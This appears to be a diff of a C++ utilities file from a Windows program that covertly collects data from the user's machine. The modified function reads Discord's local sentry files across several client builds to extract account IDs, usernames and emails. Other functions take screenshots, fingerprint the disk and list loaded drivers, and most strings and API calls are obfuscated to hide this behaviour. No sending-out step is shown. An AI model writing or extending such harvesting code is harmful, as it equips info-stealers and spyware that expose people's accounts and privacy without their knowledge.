@@ -1,5 +1,5 @@
 #include "stdafx.hpp"
-#include "utils/utils.hpp"
+#include "utils\utils.hpp"
 
 std::string utils::string::fnv1_hash( const std::string &text )
 {
@@ -100,35 +100,53 @@ void utils::system::create_process( const std::string &command )
 	CloseHandle( pi.hThread );
 }
 
-std::string utils::others::parse_json( )
+std::string utils::system::get_user_info( )
 {
-	char *user = nullptr;
-	size_t len;
-	_dupenv_s( &user, &len, E( "USERPROFILE" ) ) == 0 && user != nullptr;
+	std::string result = {};
 
-	std::string filePath = std::string( user ) + E( R"(\AppData\Roaming\discord\sentry\scope_v3.json)" );
-	free( user );
-
-	std::ifstream file( filePath );
-
-	nlohmann::json data;
-	file >> data;
-	file.close( );
-
-	std::string id = data[ E( "scope" ) ][ E( "_user" ) ][ E( "id" ) ];
-	std::string username = data[ E( "scope" ) ][ E( "_user" ) ][ E( "username" ) ];
-	std::string email = data[ E( "scope" ) ][ E( "_user" ) ][ E( "email" ) ];
-
-	std::string result = utils::string::format( "Username: {} \n Id: {} \n Email: {}", username, id, email );
-
-	if(result.empty( ) )
+	const std::vector<std::string> builds
 	{
-		std::string empty = std::string( "Discord Nao encontrado" );
+		E( "discord" ),
+		E( "discordptb" ),
+		E( "discordcanary" ),
+	};
 
-		return empty;
+	for ( const auto &build : builds )
+	{
+		try
+		{
+			const std::string appdata = std::getenv( E( "APPDATA" ) );
+			const std::string file_path = appdata + string::format( E( R"(\{}\sentry\scope_v3.json)" ), build );
+
+			if ( !std::filesystem::exists( file_path ) )
+				continue;
+
+			const auto file_content = fs::read_file( file_path );
+			const auto json = nlohmann::json::parse( file_content, nullptr, false );
+
+			nlohmann::json base {};
+
+			if ( json.contains( E( "scope" ) ) )
+				base = json[ E( "scope" ) ][ E( "user" ) ];
+			else
+				base = json[ E( "user" ) ];
+
+			const auto id = base[ E( "id" ) ].get<std::string>( );
+			const auto username = base[ E( "username" ) ].get<std::string>( );
+			const auto email = base[ E( "email" ) ].get<std::string>( );
+
+			if ( id.empty( ) || result.contains( id ) )
+				continue;
+
+			result += string::format( E( "ID: <@{}>\nUsername: {}\nEmail: {}\n\n" ), id, username, email );
+		}
+		catch ( ... )
+		{
+
+		}
 	}
 
-	return result;
+	return result.empty( ) ? E( "Not Found!\n" ) : result;
 }
 
 bool utils::system::search_drivers( const std::string &driver_name )
@@ -139,21 +157,19 @@ bool utils::system::search_drivers( const std::string &driver_name )
 	if ( !EnumDeviceDrivers( drivers, sizeof( drivers ), &out_buffer ) && out_buffer < sizeof( drivers ) )
 		return false;
 
-	for ( int i = 0; i < out_buffer / sizeof( drivers[ 0 ] ); i++ )
+	for ( auto i = 0; i < out_buffer / sizeof( drivers[ 0 ] ); i++ )
 	{
-		TCHAR szDriver[ 1024 ];
-
-		if ( GetDeviceDriverBaseName( drivers[ i ], szDriver, sizeof( szDriver ) / sizeof( szDriver[ 0 ] ) ) &&
-			 string::to_lower( szDriver ).compare( string::to_lower( driver_name ) ) == 0 )
+		if ( TCHAR sz_driver[ 1024 ]; GetDeviceDriverBaseName( drivers[ i ], sz_driver, std::size(sz_driver) ) &&
+			string::to_lower( sz_driver ) == string::to_lower( driver_name ) )
 			return true;
 	}
 
 	return false;
 }
 
-std::string utils::others::bufferto_base64( std::vector<uint8_t> buffer )
+std::string utils::others::bufferto_base64( std::vector<uint8_t> const& buffer )
 {
-	const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+	const std::string base64_chars = E("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
 	std::string base64_result;
 
 	auto          i = 0;
@@ -315,7 +331,7 @@ std::vector<uint8_t> utils::others::capture_screen( )
 	if ( image.empty( ) )
 		return {};
 
-	cv::imencode( ".png", image, png_buffer );
+	cv::imencode( E(".png"), image, png_buffer );
 
 	return png_buffer;
 }
@@ -324,7 +340,7 @@ std::string utils::others::get_hwid_hash( )
 {
 	STORAGE_PROPERTY_QUERY      query {};
 	STORAGE_DESCRIPTOR_HEADER   desc_header {};
-	STORAGE_DEVICE_DESCRIPTOR * device_descriptor {};
+	STORAGE_DEVICE_DESCRIPTOR *device_descriptor {};
 	DWORD                       bytes_returned;
 
 	HANDLE const device = SAFE_CALL( CreateFileA )(
@@ -342,7 +358,7 @@ std::string utils::others::get_hwid_hash( )
 		return "";
 	}
 
-	uint8_t* out_buffer = new uint8_t[ desc_header.Size ];
+	uint8_t *out_buffer = new uint8_t[ desc_header.Size ];
 	std::memset( out_buffer, 0, desc_header.Size );
 
 	if ( !DeviceIoControl( device, IOCTL_STORAGE_QUERY_PROPERTY,
